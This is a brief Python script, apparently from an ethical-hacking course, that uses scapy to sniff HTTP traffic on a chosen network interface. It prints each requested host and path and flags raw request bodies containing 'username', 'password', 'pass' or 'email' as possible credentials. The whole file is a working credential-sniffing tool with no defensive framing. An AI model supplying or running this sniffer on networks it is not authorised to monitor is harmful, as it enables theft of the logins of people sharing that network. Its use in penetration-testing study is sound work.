import scapy.all as scapy
from scapy.layers import http
import argparse


def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface",
                        help="Specify interface on which you wanna sniff packets.")
    arguments = parser.parse_args()
    return arguments.interface


def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print(" [+] Possible password/username >> " + load)
                    break

iface = get_interface()
sniff(iface)
